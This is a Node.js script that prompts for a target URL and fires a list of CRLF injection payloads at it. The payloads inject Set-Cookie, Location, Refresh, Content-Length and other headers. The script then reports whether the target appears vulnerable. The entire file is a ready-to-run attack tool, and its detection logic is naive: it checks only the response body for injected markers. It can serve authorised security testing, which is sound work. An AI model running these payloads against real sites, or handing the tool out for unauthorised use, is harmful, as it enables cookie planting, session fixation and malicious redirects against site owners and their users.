const readline = require('readline');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

rl.question("Enter your target URL: ", (TARGET_URL) => {
  const payloads = [
    // CRLF injection in Set-Cookie header
    "username=test%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A&password=test",

    // CRLF injection in Content-Length header
    "username=test%0D%0AContent-Length:%200%0D%0A&password=test",

    // CRLF injection in Refresh header
    "username=test%0D%0ARefresh:%200%0D%0A&password=test",

    // CRLF injection in Location header
    "username=test%0D%0ALocation:%20https://www.bbc.com%0D%0A&password=test",

    // CRLF injection in User-Agent header
    "User-Agent:%20Malicious%0D%0Ausername=test&password=test",

    // CRLF injection in Referer header
    "Referer:%20https://www.bbc.com%0D%0Ausername=test&password=test",

    // CRLF injection in Proxy header
    "Proxy:%20https://www.bbc.com%0D%0Ausername=test&password=test",

    // CRLF injection in Set-Cookie2 header
    "Set-Cookie2:%20maliciousCookie=maliciousValue%0D%0Ausername=test&password=test",

    // CRLF injection in any other custom header
    "CustomHeader:%20Injection%0D%0Ausername=test&password=test",

    // CRLF injection in HTTP request method
    "POST /login%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A HTTP/1.1%0D%0AHost: example.com%0D%0AContent-Length: 0%0D%0A%0D%0A",

    // CRLF injection in HTTP version
    "POST /login HTTP/1.1%0D%0AHost: example.com%0D%0AContent-Length: 0%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0A",

    // CRLF injection in MIME types
    "Content-Type: text/html%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A%0D%0Ausername=test&password=test",

    // CRLF injection in HTML comment
    "<!--%0D%0ASet-Cookie:%20maliciousCookie=maliciousValue%0D%0A-->"
    // Add more payloads here
  ];

  // Testing function to send requests and check responses
  async function testCRLFInjection(payload) {
    try {
      const response = await fetch(TARGET_URL, {
        method: 'POST',
        body: payload
      });
      const responseBody = await response.text();

      if (
        responseBody.includes('maliciousCookie=maliciousValue') ||
        responseBody.includes('Refresh: 0') ||
        responseBody.includes('Content-Length: 0') ||
        responseBody.includes('Location: https://www.bbc.com')
      ) {
        console.log(`Vulnerable to CRLF Injection: ${payload}`);
      } else {
        console.log(`Not vulnerable to CRLF Injection: ${payload}`);
      }
    } catch (error) {
      console.error(`Error occurred: ${error}`);
    }
  }

  // Loop through payloads and test for vulnerabilities
  payloads.forEach(testCRLFInjection);

  rl.close();
});
